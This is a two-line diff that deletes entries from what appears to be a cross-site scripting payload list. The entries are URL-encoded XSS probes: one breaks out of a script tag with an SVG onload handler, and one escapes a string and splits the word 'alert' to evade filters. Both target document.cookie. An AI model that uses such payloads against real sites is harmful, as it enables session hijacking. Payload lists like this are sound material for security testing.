@@ -1,2 +1,0 @@
-%22}%3C/script%3E%3Csvg/onload=alert(document.cookie)%3E
-test%27);top[%22al%22%2b%22ert%22](document.cookie)(%27
